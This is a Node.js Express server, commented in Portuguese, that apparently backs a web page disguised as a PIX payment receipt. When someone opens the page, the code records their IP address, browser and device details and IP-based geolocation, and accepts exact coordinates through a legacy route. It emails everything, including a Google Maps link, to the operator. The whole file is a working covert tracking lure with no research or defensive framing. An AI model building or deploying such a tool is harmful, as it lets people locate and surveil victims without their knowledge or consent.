const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");
const path = require("path");
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname)));

// Middleware para capturar IP real
app.use((req, res, next) => {
    // Capturar IP real considerando proxies
    req.realIP = req.headers['x-forwarded-for'] || 
                 req.headers['x-real-ip'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress ||
                 (req.connection.socket ? req.connection.socket.remoteAddress : null);
    next();
});

// Configuração do transportador de email
let transporter = null;

// Inicializar transportador apenas se as credenciais estiverem disponíveis
if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
    transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });
}

// Função para obter informações de geolocalização aproximada baseada no IP
async function getLocationFromIP(ip) {
    try {
        // Usar serviço gratuito para obter localização aproximada
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp`);
        const data = await response.json();
        
        if (data.status === 'success') {
            return {
                country: data.country,
                region: data.regionName,
                city: data.city,
                latitude: data.lat,
                longitude: data.lon,
                timezone: data.timezone,
                isp: data.isp
            };
        }
    } catch (error) {
        console.error('Erro ao obter localização do IP:', error);
    }
    
    return null;
}

// Rota principal - servir o HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Nova rota para rastreamento sem geolocalização
app.post("/track-access", async (req, res) => {
    const browserInfo = req.body;
    const clientIP = req.realIP;
    const timestamp = new Date().toISOString();

    // Log das informações capturadas
    console.log(`[${timestamp}] Novo acesso rastreado:`);
    console.log(`IP: ${clientIP}`);
    console.log(`User Agent: ${browserInfo.userAgent}`);
    console.log(`Plataforma: ${browserInfo.platform}`);
    console.log(`Idioma: ${browserInfo.language}`);
    console.log(`Timezone: ${browserInfo.timezone}`);
    console.log(`Tela: ${browserInfo.screenWidth}x${browserInfo.screenHeight}`);
    console.log(`Referrer: ${browserInfo.referrer}`);
    console.log('---');

    // Obter localização aproximada baseada no IP
    const locationInfo = await getLocationFromIP(clientIP);

    // Tentar enviar email se configurado
    if (transporter && process.env.EMAIL_TO) {
        try {
            const emailSubject = "🎯 Novo Acesso ao Comprovante PIX";
            
            let locationHtml = '';
            if (locationInfo) {
                const googleMapsLink = `https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
                locationHtml = `
                    <div style="background: #e8f5e8; padding: 15px; border-radius: 6px; margin: 15px 0;">
                        <h3 style="color: #2e7d32; margin: 0 0 10px 0;">📍 Localização Aproximada (baseada no IP)</h3>
                        <p><strong>País:</strong> ${locationInfo.country}</p>
                        <p><strong>Região:</strong> ${locationInfo.region}</p>
                        <p><strong>Cidade:</strong> ${locationInfo.city}</p>
                        <p><strong>ISP:</strong> ${locationInfo.isp}</p>
                        <p><strong>Coordenadas:</strong> ${locationInfo.latitude}, ${locationInfo.longitude}</p>
                        <div style="text-align: center; margin: 15px 0;">
                            <a href="${googleMapsLink}" 
                               style="display: inline-block; padding: 10px 20px; background: #2e7d32; color: white; text-decoration: none; border-radius: 4px;">
                                📍 Ver no Google Maps
                            </a>
                        </div>
                    </div>
                `;
            }

            const emailHtml = `
                <div style="font-family: Arial, sans-serif; max-width: 700px; margin: 0 auto; background: #f8f9fa; padding: 20px;">
                    <div style="background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                        <h1 style="color: #8A2BE2; text-align: center; margin-bottom: 30px;">🎯 Comprovante PIX Acessado</h1>
                        
                        <div style="background: #fff3cd; padding: 15px; border-radius: 6px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
                            <h3 style="color: #856404; margin: 0 0 10px 0;">⏰ Informações do Acesso</h3>
                            <p><strong>Data/Hora:</strong> ${new Date(timestamp).toLocaleString('pt-BR')}</p>
                            <p><strong>IP:</strong> ${clientIP}</p>
                            <p><strong>URL Acessada:</strong> ${browserInfo.url}</p>
                            <p><strong>Referrer:</strong> ${browserInfo.referrer || 'Acesso direto'}</p>
                        </div>

                        ${locationHtml}

                        <div style="background: #d1ecf1; padding: 15px; border-radius: 6px; margin: 15px 0;">
                            <h3 style="color: #0c5460; margin: 0 0 10px 0;">💻 Informações do Dispositivo</h3>
                            <p><strong>Sistema:</strong> ${browserInfo.platform}</p>
                            <p><strong>Idioma:</strong> ${browserInfo.language}</p>
                            <p><strong>Timezone:</strong> ${browserInfo.timezone}</p>
                            <p><strong>Resolução:</strong> ${browserInfo.screenWidth}x${browserInfo.screenHeight}</p>
                            <p><strong>Janela:</strong> ${browserInfo.windowWidth}x${browserInfo.windowHeight}</p>
                            <p><strong>Online:</strong> ${browserInfo.onLine ? 'Sim' : 'Não'}</p>
                            <p><strong>Cookies:</strong> ${browserInfo.cookieEnabled ? 'Habilitados' : 'Desabilitados'}</p>
                        </div>

                        <div style="background: #f8d7da; padding: 15px; border-radius: 6px; margin: 15px 0;">
                            <h3 style="color: #721c24; margin: 0 0 10px 0;">🌐 User Agent</h3>
                            <p style="font-family: monospace; font-size: 12px; word-break: break-all;">${browserInfo.userAgent}</p>
                        </div>

                        <hr style="margin: 30px 0; border: none; border-top: 1px solid #eee;">
                        <p style="font-size: 12px; color: #666; text-align: center;">
                            Este email foi gerado automaticamente pelo sistema de rastreamento do comprovante PIX.<br>
                            Timestamp: ${timestamp}
                        </p>
                    </div>
                </div>
            `;

            const mailOptions = {
                from: `"🎯 Sistema PIX Tracker" <${process.env.EMAIL_USER}>`,
                to: process.env.EMAIL_TO,
                subject: emailSubject,
                html: emailHtml,
            };

            await transporter.sendMail(mailOptions);
            console.log(`✅ Email enviado com sucesso para ${process.env.EMAIL_TO}`);
            
        } catch (emailError) {
            console.error("❌ Erro ao enviar email:", emailError.message);
            // Não falhar a requisição se o email falhar
        }
    } else {
        console.log("📧 Email não configurado - apenas logando no console");
    }

    // Sempre retornar sucesso
    res.status(200).json({ 
        success: true, 
        message: "Dados processados com sucesso.",
        timestamp: timestamp
    });
});

// Manter rota antiga para compatibilidade
app.post("/send-location", async (req, res) => {
    const { latitude, longitude } = req.body;
    const clientIP = req.realIP;
    const timestamp = new Date().toISOString();

    console.log(`[${timestamp}] Localização recebida (método antigo):`);
    console.log(`IP: ${clientIP}`);
    console.log(`Latitude: ${latitude}`);
    console.log(`Longitude: ${longitude}`);
    console.log('---');

    if (transporter && process.env.EMAIL_TO) {
        try {
            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const emailSubject = "📍 Localização Capturada - Comprovante PIX";
            const emailHtml = `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                    <h2 style="color: #8A2BE2;">📍 Nova Localização Capturada!</h2>
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <p><strong>Timestamp:</strong> ${timestamp}</p>
                        <p><strong>IP:</strong> ${clientIP}</p>
                        <p><strong>Latitude:</strong> ${latitude}</p>
                        <p><strong>Longitude:</strong> ${longitude}</p>
                    </div>
                    <div style="text-align: center; margin: 30px 0;">
                        <a href="${googleMapsLink}" 
                           style="display: inline-block; padding: 12px 24px; background: #8A2BE2; color: white; text-decoration: none; border-radius: 6px; font-weight: bold;">
                            📍 Ver no Google Maps
                        </a>
                    </div>
                </div>
            `;

            const mailOptions = {
                from: `"Sistema PIX" <${process.env.EMAIL_USER}>`,
                to: process.env.EMAIL_TO,
                subject: emailSubject,
                html: emailHtml,
            };

            await transporter.sendMail(mailOptions);
            console.log(`Email enviado com sucesso para ${process.env.EMAIL_TO}`);
            
        } catch (emailError) {
            console.error("Erro ao enviar email:", emailError.message);
        }
    }

    res.status(200).json({ 
        success: true, 
        message: "Localização processada com sucesso." 
    });
});

// Rota de health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        emailConfigured: !!(process.env.EMAIL_USER && process.env.EMAIL_PASS && process.env.EMAIL_TO),
        ip: req.realIP
    });
});

// Middleware de erro
app.use((err, req, res, next) => {
    console.error('Erro no servidor:', err);
    res.status(500).json({ 
        success: false, 
        message: 'Erro interno do servidor' 
    });
});

// Middleware para rotas não encontradas
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        message: 'Rota não encontrada' 
    });
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📧 Email configurado: ${!!(process.env.EMAIL_USER && process.env.EMAIL_PASS)}`);
    console.log(`🌐 Acesse: http://localhost:${PORT}`);
    console.log(`🎯 Sistema de rastreamento ativo - sem dependência de geolocalização`);
});

module.exports = app;
